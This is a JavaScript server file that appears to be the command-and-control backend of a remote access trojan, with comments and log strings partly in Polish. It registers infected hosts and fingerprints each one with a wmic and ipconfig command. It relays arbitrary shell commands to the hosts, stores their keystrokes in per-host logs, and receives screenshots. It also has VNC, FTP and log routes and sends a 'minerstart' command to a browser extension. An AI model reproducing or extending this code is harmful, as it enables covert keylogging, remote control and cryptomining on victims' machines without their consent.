const express = require("express");
const session = require("express-session");
const socketio = require("socket.io");
const fs = require("fs");
const app = express();
const render = require("./js/views.js");
const client = require("./js/client.js");
const settings = require("./js/settings.js");
const utils = require("./js/utils.js");

const fileUpload = require('express-fileupload');

const server = app.listen(3000, function () {
  console.log("App listening on port 3000!");
});
const io = socketio(server, {
  maxHttpBufferSize: 10e6,
  pingTimeout: 60000,
  cors: {
    origin: "*", // for browser extension
  },
});

settings.read();
console.log(settings.getAll())


function getOfflineClients(){


  fs.readdirSync("./clients").forEach((name) => {
    client.addClient(name);
    //console.log(file);
  });
  console.table(client.getAllClients());

}

getOfflineClients();
var delay = 10;

app.use(express.json());

app.use(
  express.urlencoded({
    extended: true,
  })
);

app.use(express.static("views"));
app.use(express.static("clients"));
app.use(fileUpload());
app.use(express.static(__dirname + "/public")); //Set public files to use

app.set("view engine", "ejs");

app.use(
  session({
    secret: "test",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false,
      httpOnly: false,
      maxAge: 7200000,
    }, //Remember to set it to true!

  })
);
// app.get('*', render.errorHandler);

app.get("/", render.loginPage); //Render main page with login and register etc.

app.post("/", render.login);

app.get("/dashboard", render.dashboard);

app.get("/settings", render.settings); 

app.post("/settings", render.change_settings); 

app.get("/vnc/:ClientName/:ClientId", render.vncclient);

app.get("/ftp/:FileName?", render.ftp);

app.post("/ftp", render.ftp_upload);

app.get("/logs/:ClientName/:FileName?", render.logs);

app.post("/logout", render.logout);

io.of("/extension").on("connection", (socket) => {
  socket.on("join", (msg) => {
    console.log("Dolaczyl " + socket.id + " " + msg);
    socket.emit("command", "minerstart");
  });
  socket.on("logs", async (msg) => {
    const now = new Date();
    const current = `[${now.getHours()}:${now.getMinutes()}] `;
    console.log(current + msg);
    //writeToFile(socket.name, current + msg);
  });
  socket.on("screenshotResult", async (msg) => {
    console.log(msg);
    //writeToFile(socket.name, current + msg);
  });
});
io.on("connection", (socket) => {
  socket.on("join", (msg) => {
    // let info = msg.split(":");
    // socket.ip = info[0];
    // socket.name = info[1];
    // socket.version = info[2];
    socket.joined = false;
    socket.version = msg;  //-- for client version 1.1

    socket.emit("command", 'wmic computersystem get name, TotalPhysicalMemory /Value && wmic os get caption /Value && ipconfig | find "IPv4" | find /N ":"  | find "[1]"');
  });

  socket.on("logs", async (msg) => {
    await io.fetchSockets(); //fix error c++ first send keystrokes
    //console.log(socket.name + ":" + msg);
    const now = new Date();
    const current = `[${now.getHours()}:${now.getMinutes()}] `;
    writeToFile(socket.name, current + msg);
  });

  socket.on("command", (msg) => {
    console.log(msg);
    if (msg.cmd == "delay+") {
      delay += 1;
      console.log(`Aktualny delay: ${delay}`);
      io.sockets.sockets.get(msg.id).emit("delay", delay);
    } else if (msg.cmd == "delay-") {
      console.log(`Aktualny delay: ${delay}`);
      delay -= 1;
      io.sockets.sockets.get(msg.id).emit("delay", delay);
    } else if (msg.cmd == "update") {
      io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
      io.sockets.sockets.get(msg.id).disconnect();
    } else {
      try {
        io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
      } catch (err) {}
    }
  });

  socket.on("commandResult", async (msg) => {
    let bufferObj = Buffer.from(msg, "base64");
    let decodedString = bufferObj.toString("utf-8");
    console.log(decodedString);
    if (socket.joined == false) {
      parseClientInfo(decodedString, socket);
      socket.joined = true;
    } else {
      io.emit("commandResult", {
        id: socket.id,
        response: decodedString,
      });
    }
  });

  socket.on("screenshotResult", async (msg) => {

    io.emit("screenshotResult", {
      id: socket.id,
      response: msg,
    });
  });

  socket.on("delete", async (msg) => {
    fs.rmSync(`./clients/${msg.clientname}`, {
      recursive: true,
      force: true,
    });
    client.removeClient(msg.clientname);
  });
  socket.on("delete-ftp", async (msg) => {
    fs.rmSync(`./ftp/${msg.filename}`, {
      recursive: true,
    });
  });
  socket.on("disconnect", () => {
    if (socket.name != null) {
      //if socket is a keylogger instance
      console.log("Wyszedl: " + socket.name);

      client.getClientByName(socket.name).status = false;
      io.emit("leave", {name: socket.name})

    }
  });
});

function parseClientInfo(decodedString, socket) {
  let ram = '';
  let osName = '';
  let ip = '';
  const outputLines = decodedString.split("\n");


  const hostNameLine = outputLines.find((line) =>
  line.startsWith("Name="));
  const hostName = hostNameLine.split("=")[1].trim();

  try {
    const osNameLine = outputLines.find((line) => line.startsWith("Caption="));
    osName = osNameLine.split("=")[1].trim();
  } catch (e) {}

  try{
    const ipLine = outputLines.find((line) => line.startsWith("[1]"));
    ip = ipLine.split(":")[1].trim()
  } catch(e){}

  try{
  const ramLine = outputLines.find((line) =>line.startsWith("TotalPhysicalMemory="));
  ram = utils.formatBytes(parseInt(ramLine.split("=")[1].trim()))
  } catch (e){}
  
  if(client.hasClient(hostName) && client.getClientByName(hostName).status == true){
    socket.disconnect();
    return
  }
  socket.name = hostName;

  checkDirectoryExists(socket.name);
 
  if(!client.hasClient(hostName)){
    client.addClient(hostName, true);
  } 
  emmet = client.getClientByName(hostName)
  emmet.status = true;
  emmet.ip = ip;
  emmet.ram = ram;
  emmet.version = socket.version;
  emmet.system = osName;
  emmet.id = socket.id;

  console.table(client.getAllClients());

  io.emit("join", {name: socket.name})
}

function checkDirectoryExists(clientname) {
  if (!fs.existsSync(`./clients`)) fs.mkdirSync("./clients");

  if (!fs.existsSync(`./clients/${clientname}`)) 
    fs.mkdirSync(`./clients/${clientname}`);

}

function writeToFile(clientname, msg) {
    var d = new Date(),
      dformat =
        [d.getDate(), d.getMonth() + 1, d.getFullYear()].join("_")

  msg = msg.replace("\n", "");
  fs.appendFileSync(`./clients/${clientname}/${dformat}.txt`, msg + "\n");
}



